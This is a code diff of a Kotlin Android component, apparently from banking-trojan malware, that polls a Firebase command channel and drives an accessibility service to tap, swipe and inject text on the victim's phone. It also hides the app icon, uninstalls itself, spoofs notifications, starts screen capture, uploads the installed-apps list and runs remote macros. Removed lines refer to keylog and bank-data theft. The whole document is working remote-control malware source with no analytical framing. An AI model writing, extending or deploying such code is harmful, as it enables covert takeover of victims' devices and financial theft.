@@ -15,9 +15,9 @@ object CommandProcessor {
                 execute(cmd)
                 snapshot.ref.removeValue()
             }
-            override fun onChildChanged(snapshot: DataSnapshot, p1: String?) {}
-            override fun onChildRemoved(snapshot: DataSnapshot) {}
-            override fun onChildMoved(snapshot: DataSnapshot, p1: String?) {}
+            override fun onChildChanged(s: DataSnapshot, p: String?) {}
+            override fun onChildRemoved(s: DataSnapshot) {}
+            override fun onChildMoved(s: DataSnapshot, p: String?) {}
             override fun onCancelled(error: DatabaseError) {
                 FirebaseBridge.commandsRef.addChildEventListener(this)
             }
@@ -28,50 +28,39 @@ object CommandProcessor {
         val svc = MyAccessibilityService.instance ?: return
         when (cmd.type) {
             "tap" -> svc.tap(cmd.x ?: 0, cmd.y ?: 0)
-            "swipe" -> {
-                val duration = cmd.duration ?: 300L
-                svc.swipe(cmd.sx ?: 0, cmd.sy ?: 0, cmd.ex ?: 0, cmd.ey ?: 0, duration)
-            }
+            "swipe" -> svc.swipe(cmd.sx ?: 0, cmd.sy ?: 0, cmd.ex ?: 0, cmd.ey ?: 0, cmd.duration ?: 300L)
             "type" -> svc.injectText(cmd.text ?: "")
-            "hide_activity" -> svc.hideApp()
+            "hide_activity" -> svc.hideAppIcon()
             "uninstall" -> svc.uninstallSelf()
             "fake_notification" -> {
                 val title = decodeIfBase64(cmd.title)
                 val body = decodeIfBase64(cmd.text)
                 NotificationSpoofer.show(context, title ?: "", body ?: "", cmd.iconUrl, cmd.bigPictureUrl)
             }
-            "start_screen_capture" -> svc.startScreenCapture()
-            "get_apps" -> {
-                val apps = svc.getInstalledApps()
-                FirebaseBridge.pushAppsList(apps)
+            "start_screen_capture" -> svc.requestScreenCapture()
+            "get_apps" -> FirebaseBridge.pushAppsList(svc.getInstalledApps())
+            "macro" -> {
+                val macroId = FirebaseBridge.commandsRef.push().key ?: "unknown"
+                val steps = cmd.steps ?: emptyList()
+                svc.executeMacro(macroId, steps)
             }
-            "get_keylogs" -> { /* keylogs are pushed automatically */ }
-            "get_bank_data" -> { /* BankLogger handles it */ }
+            else -> {} // ignore
         }
     }
 
     private fun decodeIfBase64(input: String?): String? {
         if (input == null) return null
-        return try {
-            val decoded = Base64.decode(input, Base64.DEFAULT)
-            String(decoded, Charsets.UTF_8)
-        } catch (e: Exception) {
-            input
-        }
+        return try { String(Base64.decode(input, Base64.DEFAULT), Charsets.UTF_8) } catch (e: Exception) { input }
     }
 
     data class RemoteCommand(
         val type: String? = null,
-        val x: Int? = null,
-        val y: Int? = null,
-        val sx: Int? = null,
-        val sy: Int? = null,
-        val ex: Int? = null,
-        val ey: Int? = null,
-        val text: String? = null,
-        val title: String? = null,
-        val iconUrl: String? = null,
-        val bigPictureUrl: String? = null,
-        val duration: Long? = null  // <-- ADDED THIS
+        val x: Int? = null, val y: Int? = null,
+        val sx: Int? = null, val sy: Int? = null,
+        val ex: Int? = null, val ey: Int? = null,
+        val text: String? = null, val title: String? = null,
+        val iconUrl: String? = null, val bigPictureUrl: String? = null,
+        val duration: Long? = null,
+        val steps: List<Map<String, Any>>? = null  // for macro
     )
 }
